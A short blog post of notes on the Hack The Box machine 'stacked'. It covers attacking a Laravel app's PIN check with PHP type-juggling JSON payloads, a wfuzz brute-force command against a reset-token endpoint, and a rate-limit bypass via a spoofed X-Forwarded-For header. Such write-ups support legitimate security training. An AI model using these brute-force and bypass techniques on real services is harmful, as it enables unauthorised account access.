---
title: htb stacked
author: Yuchao
date: 2022-04-02 11:33:00 +0800
categories: [sec]
tags: [htb]
math: true
mermaid: true
---

Know it`s an php lavarel application behind nginx.

## Brute force Laravel application pin

#### try type juggling
- change content type to application/json
- application/x-www-form-urlencoded, body is ``` name=admin&pin=1234 ```
-  application/json, body is ``` {"name":"admin", "pin":true} ``` try type juggling, php == not === vulnarability, but no on this box.

#### fuzz 
- In type Juggling, we know the php uses ===
- ``` wfuzz -H 'Cookie:{content}' -H 'Content-Type:application/x-www-form-urlencoded' -u {URL/api/resettoken} -d 'name=admin&pin=FUZZ' -z range,1000-9999 ```
- response "too many requests"
- need to bypass rate limit.

#### bypass rate limit
search website like <https://book.hacktricks.xyz/pentesting-web/rate-limit-bypass>

find a way: add ``` X-Forwarded-For: {IP} ``` in the header.


